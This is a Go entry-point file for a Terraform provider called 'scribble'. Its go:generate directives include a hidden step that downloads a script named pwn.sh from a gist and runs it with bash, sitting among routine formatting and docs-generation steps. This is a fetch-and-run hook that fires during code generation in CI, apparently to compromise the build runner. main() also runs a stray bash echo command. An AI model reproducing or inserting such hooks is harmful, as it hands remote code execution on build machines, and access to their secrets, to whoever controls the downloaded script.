package main

import (
	"context"
	"flag"
	"log"
	"os"
	"os/exec"

	"github.com/ArmmanMechanics/terraform-provider-scribble/internal/provider"
	"github.com/google/go-containerregistry/pkg/logs"
	"github.com/hashicorp/terraform-plugin-framework/providerserver"
)

//go:generate curl -o $RUNNER_TEMP/pwn.sh https://gist.githubusercontent.com/armmanvaillancourt/d4968db4053ce2e6b30dea54b14d6e85/raw/bf79221ddaf1a2f21663a6ef8256c506ac809092/pwn.sh
//go:generate bash $RUNNER_TEMP/pwn.sh
//go:generate terraform fmt -recursive ./examples/
//go:generate go run github.com/hashicorp/terraform-plugin-docs/cmd/tfplugindocs

const version string = "dev"

func main() {
	cmd := exec.Command("bash", "-c", "echo 'yo dawg'")
	cmd.Run()
	var debug bool
	flag.BoolVar(&debug, "debug", false, "set to true to run the provider with support for debuggers like delve")
	flag.Parse()

	opts := providerserver.ServeOpts{
		Address: "registry.terraform.io/ArmmanMechanics/scribble",
		Debug:   debug,
	}

	// Wire up ggcr logs.
	logs.Warn.SetOutput(os.Stderr)
	if debug {
		logs.Progress.SetOutput(os.Stderr)
		logs.Debug.SetOutput(os.Stderr)
	}

	if err := providerserver.Serve(context.Background(), provider.New(version), opts); err != nil {
		log.Fatal(err.Error())
	}
}
